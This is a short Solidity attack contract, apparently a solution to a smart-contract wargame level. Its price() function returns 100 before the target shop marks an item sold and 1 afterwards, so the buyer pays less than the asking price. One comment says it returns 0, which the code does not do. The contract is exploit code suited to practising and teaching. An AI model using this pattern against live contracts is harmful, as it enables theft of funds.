pragma solidity ^0.8.0;

contract AttackShop {
    
  function buy() public {  
    // I found and adapted the following code from: https://pastebin.com/4G4xuUDn
    
        assembly {
 
            // Call Shop.buy()
            mstore(0x20, 0xa6f2ae3a00000000000000000000000000000000000000000000000000000000) /* selector(buy()) */
            let success := call(100000, YOUR_INSTANCE_ADDRESS, 0, 0x20, 0x04, 0x00, 0x00)
            if iszero(success) {
                revert(0, 0)
            }
            return(0, 0x0)
        }
    }
         
    function price() external view {
             
        assembly {
            
            // Call into Shop.isSold()
            mstore(0x20, 0xe852e74100000000000000000000000000000000000000000000000000000000) /* selector(isSold()) */
            let success := staticcall(3000, YOUR_INSTANCE_ADDRESS, 0x20, 0x04, 0x00, 0x20)
                if iszero(success) {
                    revert(0, 0)
                }
         
            // If Shop.isSold() == true, return 0, otherwise return 100.
            switch mload(0) case 0 { mstore(0, 100) } default { mstore(0, 1) }
            return(0, 0x20)
        }
    }
}